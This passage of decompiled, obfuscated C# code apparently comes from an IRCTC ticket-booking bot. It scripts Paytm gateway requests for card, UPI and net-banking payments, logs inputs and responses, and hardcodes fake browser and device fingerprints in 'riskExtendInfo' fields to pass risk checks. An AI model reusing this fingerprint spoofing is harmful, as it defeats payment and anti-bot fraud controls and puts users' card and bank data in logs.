                        text17 = "{\"bin\":\"526099\",\"txnType\":\"NONE\",\"isEMIDetails\":false,\"mid\":\"" + @string + "\",\"orderId\":\"" + string2 + "\"}";
                        if (string_88.Contains("_CC"))
                        {
                            text17 = "{\"bin\":\"526099\",\"txnType\":\"NONE\",\"isEMIDetails\":false,\"mid\":\"" + @string + "\",\"orderId\":\"" + string2 + "\"}";
                        }
                        text9 = "{\"head\":{\"version\":\"v1\",\"requestTimestamp\":" + text16 + ",\"channelId\":\"WEB\",\"txnToken\":\"" + string3 + "\",\"workFlow\":\"enhancedCashierFlow\",\"token\":\"" + string3 + "\",\"tokenType\":\"TXN_TOKEN\"},\"body\":" + text17 + "}";
                        bool_29 = true;
                        _Request(string_93, text9, string_92, webProxy_3, ref cookieContainer_, false, true, 60000, 60000, ref string_99, ref string_98, ref webException_0);
                        string_93 = text13 + "api/v1/processTransaction?mid=" + @string + "&orderId=" + string2;
                        text16 = method_14();
                        string text18 = "1";
                        text17 = "{\"paymentMode\":\"DEBIT_CARD\",\"authMode\":\"otp\",\"cardInfo\":\"|" + text3 + "|" + text7 + "|" + text4 + text5 + "\",\"storeInstrument\":\"1\",\"requestType\":\"NATIVE\",\"mid\":\"" + @string + "\",\"orderId\":\"" + string2 + "\",\"paymentFlow\":\"NONE\",\"selectedPaymentModeId\":" + text18 + "}";
                        if (string_88.Contains("_CC"))
                        {
                            text18 = "1";
                            text17 = "{\"paymentMode\":\"CREDIT_CARD\",\"authMode\":\"otp\",\"cardInfo\":\"|" + text3 + "|" + text7 + "|" + text4 + text5 + "\",\"storeInstrument\":\"1\",\"requestType\":\"NATIVE\",\"mid\":\"" + @string + "\",\"orderId\":\"" + string2 + "\",\"paymentFlow\":\"NONE\",\"selectedPaymentModeId\":" + text18 + "}";
                        }
                        text9 = "{\"head\":{\"version\":\"v1\",\"requestTimestamp\":" + text16 + ",\"channelId\":\"WEB\",\"txnToken\":\"" + string3 + "\",\"workFlow\":\"enhancedCashierFlow\",\"token\":\"" + string3 + "\",\"tokenType\":\"TXN_TOKEN\"},\"body\":" + text17 + "}";
                        bool_29 = true;
                        if (!_Request(string_93, text9, string_92, webProxy_3, ref cookieContainer_, false, true, 60000, 60000, ref string_99, ref string_98, ref webException_0))
                        {
                            clsMain.Lock("First Hit Failed. err = " + string_98);
                            string_91 = "Paytm Gateway not working - Payment Failed";
                            return false;
                        }
                        if (string_99.Contains("resultStatus\":\"S"))
                        {
                            string text19 = string_99.Substring(string_99.IndexOf("callbackUrl") + 14);
                            text19 = text19.Substring(0, text19.IndexOf("\""));
                            string text20 = string_99.Substring(string_99.IndexOf("content") + 10);
                            text20 = text20.Substring(0, text20.IndexOf("\"}"));
                            text20 = text20.Replace("\":", "#").Replace(",", "&");
                            text20 = text20.Replace("\\\"", "").Replace("\\", "").Replace("\"", "");
                            string_99 = method_168(text19, text20);
                        }
                    }
                    else
                    {
                        if (string_88.Contains("BHIMUPI") || string_88.Contains("PHONEPE") || string_88.Contains("PTMBHIMUPI"))
                        {
                            string_93 = text13 + "api/v1/fetchPcfDetails?mid=" + @string + "&orderId=" + string2;
                            string text21 = "{\"payMethods\":[{\"payMethod\":\"UPI\",\"instId\":null}],\"mid\":\"" + @string + "\",\"orderId\":\"" + string2 + "\"},\"showLoader\":false";
                            text9 = "{\"head\":{\"version\":\"v1\",\"requestTimestamp\":" + text16 + ",\"channelId\":\"WEB\",\"txnToken\":\"" + string3 + "\",\"workFlow\":\"enhancedCashierFlow\",\"token\":\"" + string3 + "\",\"tokenType\":\"TXN_TOKEN\"},\"body\":" + text21 + "}";
                            text9 = "{\"head\":{\"version\":\"v1\",\"requestTimestamp\":" + text16 + ",\"channelId\":\"WEB\",\"txnToken\":\"" + string3 + "\",\"workFlow\":\"enhancedCashierFlow\",\"token\":\"" + string3 + "\",\"tokenType\":\"TXN_TOKEN\"},\"body\":{\"payMethods\":[{\"payMethod\":\"UPI\",\"instId\":null}],\"txnAmount\":\"" + string4 + "\",\"useAmount\":false,\"mid\":\"" + @string + "\",\"orderId\":\"" + string2 + "\"},\"showLoader\":true}";
                            bool_29 = true;
                            bool_29 = true;
                            _Request(string_93, text9, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_99, ref string_98, ref webException_0);
                            string text22 = "totalTransactionAmount\":{\"currency\":\"INR\",\"value\":\"";
                            int length = text22.Length;
                            text22 = string_99.Substring(string_99.IndexOf(text22) + length);
                            string text23 = text22.Substring(0, text22.IndexOf("\""));
                            while (true)
                            {
                                text16 = method_14();
                                string_93 = text13 + "api/v1/vpa/validate?mid=" + @string + "&orderId=" + string2;
                                text21 = "{\"vpa\":\"" + text3 + "\",\"mid\":\"" + @string + "\",\"orderId\":\"" + string2 + "\"}";
                                text9 = "{\"head\":{\"version\":\"v1\",\"requestTimestamp\":" + text16 + ",\"channelId\":\"WEB\",\"txnToken\":\"" + string3 + "\",\"workFlow\":\"enhancedCashierFlow\",\"token\":\"" + string3 + "\",\"tokenType\":\"TXN_TOKEN\"},\"body\":" + text21 + "}";
                                string string_100 = string_93;
                                string string_101 = text9;
                                bool_29 = true;
                                _Request(string_100, string_101, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_99, ref string_98, ref webException_0);
                                text16 = method_14();
                                string_93 = text13 + "api/v1/processTransaction?mid=" + @string + "&orderId=" + string2;
                                text21 = string.Concat("{\"paymentMode\":\"UPI\",\"payerAccount\":\"", text3, "\",\"requestType\":\"NATIVE\",\"authMode\":\"3D\",\"mid\":\"", @string, "\",\"orderId\":\"", string2, "\",\"riskExtendInfo\":\"userAgent:Mozilla\"/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit\"/537.36 (KHTML, like Gecko) Chrome\"/90.0.4430.85 Safari\"/537.36|timeZone:Asia\"/Calcutta|operationType:PAYMENT|businessFlow:STANDARD|amount:" + text23 + "|merchantType:offus|language:en-US|screenResolution:1536X864|osType:Windows|osVersion:10|platform:WEB|channelId:WEB|deviceType:Desktop|browserType:Chrome|browserVersion:68.0.3440.106|\",\"paymentFlow\":\"NONE\",\"selectedPaymentModeId\":2},\"showPostFetchLoader\":false");
                                text9 = "{\"head\":{\"version\":\"v1\",\"requestTimestamp\":" + text16 + ",\"channelId\":\"WEB\",\"txnToken\":\"" + string3 + "\",\"workFlow\":\"enhancedCashierFlow\",\"token\":\"" + string3 + "\",\"tokenType\":\"TXN_TOKEN\"},\"body\":" + text21 + "}";
                                text9 = "{\"head\":{\"version\":\"v1\",\"requestTimestamp\":" + text16 + ",\"channelId\":\"WEB\",\"txnToken\":\"" + string3 + "\",\"workFlow\":\"enhancedCashierFlow\",\"token\":\"" + string3 + "\",\"tokenType\":\"TXN_TOKEN\"},\"body\":{\"paymentMode\":\"UPI\",\"payerAccount\":\"" + text3 + "\",\"showPostFetchLoader\":false,\"requestType\":\"NATIVE\",\"authMode\":\"3D\",\"mid\":\"" + @string + "\",\"orderId\":\"" + string2 + "\",\"riskExtendInfo\":\"userAgent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36|timeZone:Asia/Calcutta|operationType:PAYMENT|refererURL:https://www.irctc.co.in/|businessFlow:STANDARD|amount:" + text23 + "|merchantType:offus|language:en-US|screenResolution:1920X1080|networkType:4g|osType:Windows|osVersion:10|platform:WEB|channelId:WEB|deviceType:Desktop|browserType:Chrome|browserVersion:106.0.0.0|\",\"paymentFlow\":\"NONE\",\"selectedPaymentModeId\":2},\"showPostFetchLoader\":false}";
                                bool_29 = true;
                                _Request(string_93, text9, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_99, ref string_98, ref webException_0);
                                string string5 = GetString(string_99, "TXN_AMOUNT");
                                string string6 = GetString(string_99, "transId");
                                string string7 = GetString(string_99, "cashierRequestId");
                                string string8 = GetString(string_99, "MERCHANT_VPA");
                                string_93 = string.Concat(new string[4] { "https://securegw.paytm.in/theia/upi/transactionStatus?MID=", @string, "&ORDER_ID=", string2 });
                                text9 = "merchantId=" + @string + "&ORDER_ID=" + string2 + "&transId=" + string6 + "&cashierRequestId=" + string7 + "&paymentMode=UPI";
                                updateTStatus_1.BeginInvoke(1, "Init. PAYTM Websafe-2/3", tCntrlName_, null, null);
                                DateTime dateTime = DateTime.Now.AddSeconds(20.0);
                                if (string_87.Contains("@axisbank"))
                                {
                                    while (true)
                                    {
                                        if (DateTime.Now > dateTime)
                                        {
                                            updateTStatus_1.BeginInvoke(1, "AXIS UPI Pay Start...", tCntrlName_, null, null);
                                            frmUPI.payStart = true;
                                            break;
                                        }
                                        if (frmUPI.payStart)
                                        {
                                            Application.DoEvents();
                                            Thread.Sleep(100);
                                            continue;
                                        }
                                        updateTStatus_1.BeginInvoke(1, "AXIS UPI Pay Start...", tCntrlName_, null, null);
                                        frmUPI.payStart = true;
                                        break;
                                    }
                                }
                                else
                                {
                                    updateTStatus_1.BeginInvoke(1, "Accept UPI Request..", tCntrlName_, null, null);
                                }
                                DateTime dateTime2 = DateTime.Now.AddSeconds(92.0);
                                do
                                {
                                    Thread.Sleep(500);
                                    if (DateTime.Now > dateTime2)
                                    {
                                        break;
                                    }
                                    _Request(string_93, text9, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_98, ref string_98, ref webException_0);
                                }
                                while (string_98.Contains("POLL_AGAIN"));
                                while (!(string_98.Contains("insufficient Balance") | string_98.Contains("Payment inComplete")))
                                {
                                    if (!string_98.Contains("POLL_AGAIN"))
                                    {
                                        updateTStatus_1.BeginInvoke(1, "Init. PAYTM Websafe-2/3", tCntrlName_, null, null);
                                        string_93 = text13 + "transactionStatus?mid=" + @string + "&ORDER_ID=" + string2;
                                        text9 = text9 + "&vpaID=" + HttpUtility.UrlEncode(text3) + "&isSelfPush=false&upiAccepted=true&upiStatusUrl=" + HttpUtility.UrlEncode(string_93) + "&upiHandleInfo=%5Bobject+Object%5D&selfPush=false&TXN_AMOUNT=" + string5 + "&STATUS_INTERVAL=5000&STATUS_TIMEOUT=300000&MERCHANT_VPA=" + string8;
                                        if (_Request(string_93, text9, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_99, ref string_98, ref webException_0))
                                        {
                                            clsMain.Lock("Success ProcessPAYTM_Getways_BHIMUPI");
                                            if (string_99.IndexOf("ENC_DATA") <= 0 && string_99.IndexOf("CHECKSUMHASH") <= 0)
                                            {
                                                string_98 = "Payment inComplete Select anOther Gateway";
                                                continue;
                                            }
                                            string_90 = string_99;
                                            string_91 = string_92;
                                            return true;
                                        }
                                        clsMain.Lock("First Hit Failed. err = " + string_98);
                                        string_91 = "Paytm Gateway not working - Payment Failed";
                                        return false;
                                    }
                                    clsMain.Lock("Upi Payment Cancel" + response);
                                    return false;
                                }
                                string text24;
                                do
                                {
                                    ((ComboBox)clsMain.control_1.Controls["cboGateway"]).Enabled = true;
                                    clsMain.Lock("Bank ID Not Exists, Choice for another payment");
                                    updateTStatus_1.BeginInvoke(1, string_98, clsMain.tCntrlName_, null, null);
                                    frmPayment frmPayment = new frmPayment();
                                    frmPayment.string_1 = string_98;
                                    frmPayment.btnSubmit.Text = "Resume";
                                    frmPayment.bool_0 = true;
                                    frmPayment.method_1(clsMain.control_0, clsMain.rectangle_0, class3_0, class3_0.BANKSAVEAS);
                                    if (frmPayment.DialogResult == DialogResult.OK)
                                    {
                                        text24 = ((ComboBox)clsMain.control_1.Controls["cboGateway"]).SelectedItem.ToString();
                                        continue;
                                    }
                                    bool_52 = true;
                                    return false;
                                }
                                while (!text24.Contains("@"));
                                ((ComboBox)clsMain.control_1.Controls["cboGateway"]).Enabled = false;
                                text3 = class3_0.dictionary_BnkData[text24];
                                array = text3.Split(new string[1] { "||" }, StringSplitOptions.None);
                                text3 = array[0];
                            }
                        }
                        string_93 = text13 + "api/v1/fetchPcfDetails?mid=" + @string + "&orderId=" + string2;
                        string_93 = text13 + "api/v1/fetchNBPaymentChannels?mid=" + @string + "&orderId=" + string2;
                        string text25 = "{\"payMethods\":[{\"payMethod\":\"NET_BANKING\",\"instId\":\"" + text + "\"}],\"mid\":\"" + @string + "\",\"orderId\":\"" + string2 + "\"},\"showLoader\":false";
                        text9 = "{\"head\":{\"version\":\"v1\",\"requestTimestamp\":" + text16 + ",\"channelId\":\"WEB\",\"txnToken\":\"" + string3 + "\",\"workFlow\":\"enhancedCashierFlow\",\"token\":\"" + string3 + "\",\"tokenType\":\"TXN_TOKEN\"},\"body\":" + text25 + "}";
                        text9 = "{\"head\":{\"version\":\"v1\",\"requestTimestamp\":" + text16 + ",\"channelId\":\"WEB\",\"txnToken\":\"" + string3 + "\",\"workFlow\":\"enhancedCashierFlow\",\"token\":\"" + string3 + "\",\"tokenType\":\"TXN_TOKEN\"},\"body\":{\"type\":\"MERCHANT\",\"mid\":\"IRCTCw862137775\",\"orderId\":\"" + string2 + "\"}}";
                        bool_29 = true;
                        _Request(string_93, text9, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_99, ref string_98, ref webException_0);
                        string_93 = text13 + "api/v1/processTransaction?mid=" + @string + "&orderId=" + string2;
                        text25 = "{\"paymentMode\":\"NET_BANKING\",\"channelCode\":\"" + text + "\",\"requestType\":\"NATIVE\",\"authMode\":\"3D\",\"mid\":\"" + @string + "\",\"orderId\":\"" + string2 + "\",\"paymentFlow\":\"NONE\",\"selectedPaymentModeId\":3}";
                        text9 = "{\"head\":{\"version\":\"v1\",\"requestTimestamp\":" + text16 + ",\"channelId\":\"WEB\",\"txnToken\":\"" + string3 + "\",\"workFlow\":\"enhancedCashierFlow\",\"token\":\"" + string3 + "\",\"tokenType\":\"TXN_TOKEN\"},\"body\":" + text25 + "}";
                        bool_29 = true;
                        _Request(string_93, text9, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_99, ref string_98, ref webException_0);
                        if (!string_99.Contains("redirectForm"))
                        {
                            clsMain.Lock("Getting payment out error= " + response);
                            return false;
                        }
                        string text26 = string_99.Substring(string_99.IndexOf("redirectForm") + 10);
                        string text27 = text26.Substring(text26.IndexOf("actionUrl") + 12);
                        text27 = text27.Substring(0, text27.IndexOf("\","));
                        string text28 = text26.Substring(text26.IndexOf("content") + 10);
                        text28 = text28.Substring(0, text28.IndexOf("}"));
                        text28 = text28.Replace("\":", "#").Replace(",", "&").Replace("\"", "");
                        response = method_168(text27, text28);
                        bool_13 = true;
                        string text29 = string_99.Substring(string_99.IndexOf("content\":{") + 10);
                        text29 = text29.Substring(0, text29.IndexOf("}"));
                        text29 = text29.Replace("\":\"", "=").Replace("\"", "");
                        string[] array2 = text29.Split(new string[1] { "," }, StringSplitOptions.None);
                        string text30 = "";
                        for (int j = 0; j < array2.Length; j++)
                        {
                            string text31 = array2[j];
                            if (text31.Contains("https") || text31.Contains("Date"))
                            {
                                string[] array3 = text31.Split(new string[1] { "=" }, StringSplitOptions.None);
                                text31 = array3[0] + "=" + WebUtility.UrlEncode(array3[1]);
                            }
                            text30 = ((j != 0) ? (text30 + "&" + text31) : text31);
                        }
                        string string9 = GetString(string_99, "callbackUrl");
                        string_99 = text30 + "|" + string9;
                    }
                    clsMain.Lock("Third Hit Inp = " + text9);
                    bool flag2 = false;
                    try
                    {
                        if (string_99.Contains("ipg-online.com"))
                        {
                            method_145(ref string_99, string_93, cookieContainer_, string_94, ref string_91);
                        }
                        switch (text6)
                        {
                            case "52":
                                flag2 = method_117(string_99, class3_0.BANKDETAILS, string_89, ref string_90, ref string_91, updateTStatus_2);
                                break;
                            case "1":
                                {
                                    CookieContainer cookieContainer_2 = null;
                                    flag2 = SbiNetBanking(string_99, class3_0.BANKSAVEAS, class3_0.BANKDETAILS, string_89, ref string_90, ref string_91, updateTStatus_2, ref cookieContainer_2);
                                    break;
                                }
                            case "36":
                                flag2 = HdfcPAYTM(string_99, class3_0.BANKDETAILS, string_89, ref string_90, ref string_91, updateTStatus_2);
                                break;
                            case "56":
                                flag2 = method_138(string_99, class3_0.BANKDETAILS, string_89, ref string_90, ref string_91, updateTStatus_2);
                                break;
                            case "41":
                                flag2 = method_107(string_99, class3_0.BANKDETAILS, string_89, ref string_90, ref string_91, updateTStatus_2);
                                break;
                            case "45":
                                flag2 = method_120(string_99, class3_0.BANKDETAILS, string_89, ref string_90, ref string_91, updateTStatus_2);
                                break;
                        }
                    }
                    catch
                    {
                    }
                    if (!flag2)
                    {
                        return false;
                    }
                    string_99 = string_90;
                    if (string_90.Contains("ipg-online.com"))
                    {
                        method_145(ref string_90, string_93, cookieContainer_, string_94, ref string_91);
                    }
                    if (string_90.Contains(value))
                    {
                        string_92 = string_91;
                        text9 = class3_0.Method_SerialInp(string_90, ref string_93, false);
                        if (string_93.IndexOf("https://secure.paytm.in/") != 0)
                        {
                            string_93 = "https://secure.paytm.in/oltp/HANDLER_WEB_RESP/" + text + text2 + "/USRPWD";
                        }
                        clsMain.Lock("Third Hit Inp = " + text9);
                        if (!_Request(string_93, text9, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_99, ref string_98, ref webException_0))
                        {
                            clsMain.Lock("Third Hit Failed. err = " + string_98);
                            string_91 = "Gateway Not Working - Payment Failed";
                            return false;
                        }
                    }
                    if (string_90.Contains(value2))
                    {
                        string_92 = string_91;
                        text9 = class3_0.Method_SerialInp(string_90, ref string_93, false);
                        if (string_93.IndexOf("https://securegw.paytm.in/") != 0)
                        {
                            string_93 = "https://securegw.paytm.in/instaproxy/bankresponse/" + text + "/" + text2 + "/RESP";
                        }
                        clsMain.Lock("Third Hit Inp = " + text9);
                        if (!_Request(string_93, text9, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_99, ref string_98, ref webException_0))
                        {
                            clsMain.Lock("Third Hit Failed. err = " + string_98);
                            string_91 = "Gateway Not Working - Payment Failed";
                            return false;
                        }
                        string_90 = string_99;
                        if (string_90.Contains("https://securegw.paytm.in"))
                        {
                            text9 = class3_0.Method_SerialInp(string_90, ref string_93, false);
                            clsMain.Lock("Third Hit Inp = " + text9);
                            if (!_Request(string_93, text9, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_99, ref string_98, ref webException_0))
                            {
                                clsMain.Lock("Third Hit Failed. err = " + string_98);
                                string_91 = "Gateway Not Working - Payment Failed";
                                return false;
                            }
                        }
                        string_90 = string_99;
                    }
                    clsMain.Lock("Third Output htm = " + string_99);
                    if (string_99.IndexOf("https://www.irctc.co.in/eticketing/BankResponse", StringComparison.CurrentCultureIgnoreCase) <= 0)
                    {
                        string_91 = "Error Occured while Making Payment!";
                        clsMain.Lock(string_91 + ", Check HTML");
                        return false;
                    }
                    clsMain.Lock("Success ProcessCC_PTM");
                    string_90 = string_99;
                    string_91 = string_92;
                    return true;
                }
                catch (Exception ex)
                {
                    frmUPI.payStart = false;
                    clsMain.method_74("ProcessCC_PTM", ex.Message);
                    return false;
                }
            }
            return method_146(string_86, string_87, string_88, string_89, ref string_90, ref string_91, updateTStatus_2);
        }

        internal bool PayTM_SBI(string string_86, string string_87, string string_88, string string_89, ref string string_90, ref string string_91, UpdateTStatus updateTStatus_2)
        {
            bool result = false;
            string_90 = "";
            string_91 = "";
            string_88 = string_88.ToUpper();
            clsMain.Lock("Enter ProcessCC_PTM.  DETAILS: ");
            if (!string_86.Contains("paytm") & !string_86.Contains("Paytm"))
            {
                string_91 = "Some thing went wrong with Credit Card Payment";
                clsMain.Lock("Html doesn't contains paytm, returning.");
                return false;
            }
            string text = string_88;
            string text2 = "";
            string string_92 = class3_0.string_69;
            string[] array = string_87.Split(new string[1] { "||" }, StringSplitOptions.None);
            string text3 = "";
            string text4 = "";
            string text5 = "";
            try
            {
                text3 = array[0].Trim();
                text4 = array[1];
                if (array.Length > 2)
                {
                    text5 = array[2];
                }
            }
            catch
            {
            }
            string string_93 = "";
            string text6 = "";
            string string_94 = "";
            string text7 = "";
            if (!string_88.Contains("_DC") && !string_88.Contains("_CC"))
            {
                if (string_88.Contains("BHIMUPI") || string_88.Contains("PHONEPE") || string_88.Contains("PAYUUPI") || string_88.Contains("PAYTMQR"))
                {
                    text2 = "UPI";
                }
                else
                {
                    bool flag = array.Length > 4;
                    text2 = "NB";
                    string text8 = text;
                    switch (Class46.smethod_0(text8))
                    {
                        case 1145574292u:
                            if (text8 == "UNION")
                            {
                                text = "UNI";
                                text6 = "28";
                            }
                            break;
                        case 1005593931u:
                            if (text8 == "SBI")
                            {
                                text = "SBI";
                                text6 = "1";
                            }
                            break;
                        case 2970694650u:
                            if (text8 == "HDFC")
                            {
                                return method_146(string_86, string_87, string_88, string_89, ref string_90, ref string_91, updateTStatus_2);
                            }
                            break;
                        case 1934763940u:
                            if (text8 == "ICICI")
                            {
                                text6 = "44";
                            }
                            break;
                        case 3504019421u:
                            if (text8 == "IDBI")
                            {
                                text6 = "52";
                            }
                            break;
                        case 3298409214u:
                            if (!(text8 == "PAYTM"))
                            {
                                break;
                            }
                            if (clsMain.isAPP)
                            {
                                return Multi_PaytmPayApp(string_86, string_87, string_88, string_89, ref string_90, ref string_91, updateTStatus_2);
                            }
                            return method_146(string_86, string_87, string_88, string_89, ref string_90, ref string_91, updateTStatus_2);
                        case 4249340199u:
                            if (text8 == "INDUSIND")
                            {
                                text = "INDS";
                                text6 = "45";
                            }
                            break;
                        case 4021309901u:
                            if (text8 == "CORP")
                            {
                                text6 = "56";
                            }
                            else if (text8 == "AIRTELMONEY")
                            {
                                text6 = "56";
                            }
                            break;
                    }
                }
                string text9 = "";
                string value = "secure.paytm.in";
                string value2 = "securegw.paytm.in";
                text9 = class3_0.Method_SerialInp(string_86, ref string_93, true);
                if (!clsMain.isAPP)
                {
                    string text10 = string_86.Substring(string_86.IndexOf("name=\"ENC_DATA\" value=\"") + 23);
                    text10 = text10.Substring(0, text10.IndexOf("\""));
                    if (text10.Contains("\n"))
                    {
                        text10 = WebUtility.UrlEncode(text10);
                        string text11 = string_86.Substring(string_86.IndexOf("name=\"MID\" value=") + 18);
                        text11 = text11.Substring(0, text11.IndexOf("\""));
                        string text12 = string_86.Substring(string_86.IndexOf("name=\"CHECKSUMHASH\" value=") + 27);
                        text12 = text12.Substring(0, text12.IndexOf("\""));
                        text12 = WebUtility.UrlEncode(text12);
                        text9 = "MID=" + text11 + "&ENC_DATA=" + text10 + "&CHECKSUMHASH=" + text12;
                    }
                }
                if (string_86.Contains("ENC_DATA") && clsMain.isAPP)
                {
                    string string_95 = GetString_(string_86, "ENC_DATA\",\"value", "\"");
                    string_95 = HttpUtility.UrlEncode(string_95);
                    string_95 = string_95.Replace("%5cn", "%0A");
                    string string_96 = GetString_(string_86, "CHECKSUMHASH\",\"value", "\"");
                    string_96 = HttpUtility.UrlEncode(string_96);
                    string string_97 = GetString_(string_86, "MID\",\"value", "\"");
                    string_93 = GetString_(string_86, "bankUrl\",\"value", "\"");
                    text9 = "MID=" + string_97 + "&CHECKSUMHASH=" + string_96 + "&ENC_DATA=" + string_95;
                }
                string text13 = string_93.Substring(0, string_93.IndexOf(".in/") + 3);
                Uri uri = new Uri(string_93);
                text13 = "https://" + uri.Host;
                for (int i = 0; i < uri.Segments.Length - 1; i++)
                {
                    text13 += uri.Segments[i];
                }
                string text14 = ((!string_93.Contains("oltp-web")) ? string_93.Substring(0, string_93.IndexOf(".in/") + 3) : "https://secure.paytm.in/oltp-web/");
                CookieContainer cookieContainer_ = new CookieContainer();
                string string_98 = "";
                string string_99 = "";
                string sbijson = "";
                try
                {
                    Lock("First Hit Inp = " + text9);
                    if (!clsMain.isAPP)
                    {
                        text9 = method_162(text9);
                    }
                    if (!_Request(string_93, text9, string_92, webProxy_3, ref cookieContainer_, false, true, 60000, 60000, ref string_99, ref string_98, ref webException_0))
                    {
                        clsMain.Lock("First Hit Failed. err = " + string_98);
                        string_91 = "Paytm Gateway not working - Payment Failed";
                        return false;
                    }
                    clsMain.Lock("First Output htm = " + string_99);
                    updateTStatus_1.BeginInvoke(1, "Init. PAYTM Websafe-1/3", tCntrlName_, null, null);
                    string_92 = string_93;
                    text13 = "https://securegw.paytm.in/theia/";
                    if (string.IsNullOrEmpty(string_99.Trim()) || !string_99.Contains("Paytm Secure"))
                    {
                        return result;
                    }
                    string text15 = "";
                    if (!clsMain.isAPP)
                    {
                        text15 = string_99.Substring(string_99.IndexOf("var pushAppData=") + 17);
                        text15 = text15.Substring(0, text15.IndexOf("\""));
                    }
                    else
                    {
                        text15 = string_99.Substring(string_99.IndexOf("PAYTM_CHECKOUT_URL,appData") + 28);
                        //string text15 = string_100.Substring(string_100.IndexOf("pushAppData") + 13);PAYTM_CHECKOUT_URL,appData
                        text15 = text15.Substring(0, text15.IndexOf("'"));
                    }
                   
                    text15 = Class12.smethod_26(text15);
                    string @string = GetString(text15, "mid");
                    @string = GetString(text15, "mid");
                    string string2 = "";
                    if (!clsMain.isAPP)
                    {
                         string2 = GetString(text15, "insufficientBalance\":true,\"id");
                    }
                    else
                    {
                        string2 = GetString(text15, "orderId");
                    }
                   
                    string text16 = method_14();
                    string string3 = GetString(string_99, "txnToken");
                    string string4 = GetString(text15, "txnAmount");
                    string3 = GetString(text15, "txnToken");
                    if (string_88.Contains("_DC") || string_88.Contains("_CC"))
                    {
                        string_93 = text13 + "api/v1/fetchPcfDetails?mid=" + @string + "&orderId=" + string2;
                        text16 = method_14();
                        string text17 = "{\"payMethods\":[{\"payMethod\":\"DEBIT_CARD\",\"instId\":null}],\"mid\":\"" + @string + "\",\"orderId\":\"" + string2 + "\"},\"showLoader\":false";
                        if (string_88.Contains("_CC"))
                        {
                            text17 = "{\"payMethods\":[{\"payMethod\":\"CREDIT_CARD\",\"instId\":null}],\"mid\":\"" + @string + "\",\"orderId\":\"" + string2 + "\"},\"showLoader\":false";
                        }
                        text9 = "{\"head\":{\"version\":\"v1\",\"requestTimestamp\":" + text16 + ",\"channelId\":\"WEB\",\"txnToken\":\"" + string3 + "\",\"workFlow\":\"enhancedCashierFlow\",\"token\":\"" + string3 + "\",\"tokenType\":\"TXN_TOKEN\"},\"body\":" + text17 + "}";
                        bool_29 = true;
                        _Request(string_93, text9, string_92, webProxy_3, ref cookieContainer_, false, true, 60000, 60000, ref string_99, ref string_98, ref webException_0);
                        string_93 = text13 + "api/v1/fetchBinDetail?mid=" + @string + "&orderId=" + string2;
                        text16 = method_14();
                        text17 = "{\"bin\":\"526099\",\"txnType\":\"NONE\",\"isEMIDetails\":false,\"mid\":\"" + @string + "\",\"orderId\":\"" + string2 + "\"}";
                        if (string_88.Contains("_CC"))
                        {
                            text17 = "{\"bin\":\"526099\",\"txnType\":\"NONE\",\"isEMIDetails\":false,\"mid\":\"" + @string + "\",\"orderId\":\"" + string2 + "\"}";
                        }
                        text9 = "{\"head\":{\"version\":\"v1\",\"requestTimestamp\":" + text16 + ",\"channelId\":\"WEB\",\"txnToken\":\"" + string3 + "\",\"workFlow\":\"enhancedCashierFlow\",\"token\":\"" + string3 + "\",\"tokenType\":\"TXN_TOKEN\"},\"body\":" + text17 + "}";
                        bool_29 = true;
                        _Request(string_93, text9, string_92, webProxy_3, ref cookieContainer_, false, true, 60000, 60000, ref string_99, ref string_98, ref webException_0);
                        string_93 = text13 + "api/v1/processTransaction?mid=" + @string + "&orderId=" + string2;
                        text16 = method_14();
                        string text18 = "1";
                        text17 = "{\"paymentMode\":\"DEBIT_CARD\",\"authMode\":\"otp\",\"cardInfo\":\"|" + text3 + "|" + text7 + "|" + text4 + text5 + "\",\"storeInstrument\":\"1\",\"requestType\":\"NATIVE\",\"mid\":\"" + @string + "\",\"orderId\":\"" + string2 + "\",\"paymentFlow\":\"NONE\",\"selectedPaymentModeId\":" + text18 + "}";
                        if (string_88.Contains("_CC"))
                        {
                            text18 = "1";
                            text17 = "{\"paymentMode\":\"CREDIT_CARD\",\"authMode\":\"otp\",\"cardInfo\":\"|" + text3 + "|" + text7 + "|" + text4 + text5 + "\",\"storeInstrument\":\"1\",\"requestType\":\"NATIVE\",\"mid\":\"" + @string + "\",\"orderId\":\"" + string2 + "\",\"paymentFlow\":\"NONE\",\"selectedPaymentModeId\":" + text18 + "}";
                        }
                        text9 = "{\"head\":{\"version\":\"v1\",\"requestTimestamp\":" + text16 + ",\"channelId\":\"WEB\",\"txnToken\":\"" + string3 + "\",\"workFlow\":\"enhancedCashierFlow\",\"token\":\"" + string3 + "\",\"tokenType\":\"TXN_TOKEN\"},\"body\":" + text17 + "}";
                        bool_29 = true;
                        if (!_Request(string_93, text9, string_92, webProxy_3, ref cookieContainer_, false, true, 60000, 60000, ref string_99, ref string_98, ref webException_0))
                        {
                            clsMain.Lock("First Hit Failed. err = " + string_98);
                            string_91 = "Paytm Gateway not working - Payment Failed";
                            return false;
                        }
                        if (string_99.Contains("resultStatus\":\"S"))
                        {
                            string text19 = string_99.Substring(string_99.IndexOf("callbackUrl") + 14);
                            text19 = text19.Substring(0, text19.IndexOf("\""));
                            string text20 = string_99.Substring(string_99.IndexOf("content") + 10);
                            text20 = text20.Substring(0, text20.IndexOf("\"}"));
                            text20 = text20.Replace("\":", "#").Replace(",", "&");
                            text20 = text20.Replace("\\\"", "").Replace("\\", "").Replace("\"", "");
                            string_99 = method_168(text19, text20);
                        }
                    }
                    else
                    {
                        if (string_88.Contains("BHIMUPI") || string_88.Contains("PHONEPE") || string_88.Contains("PAYUUPI") || string_88.Contains("PAYTMQR"))
                        {
                            string_93 = text13 + "api/v1/fetchPcfDetails?mid=" + @string + "&orderId=" + string2;
                            string text21 = "{\"payMethods\":[{\"payMethod\":\"UPI\",\"instId\":null}],\"mid\":\"" + @string + "\",\"orderId\":\"" + string2 + "\"},\"showLoader\":false";
